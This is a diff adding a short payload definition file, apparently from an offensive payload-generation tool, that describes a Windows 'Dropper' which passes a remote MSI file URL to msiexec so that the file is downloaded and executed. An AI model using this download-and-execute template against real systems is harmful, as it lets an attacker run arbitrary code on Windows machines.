@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Passing msi file url to the Windows installer will download and execute it!
+
+[Payload]
+Type     = Dropper
+Payload  = msiexec /i {}
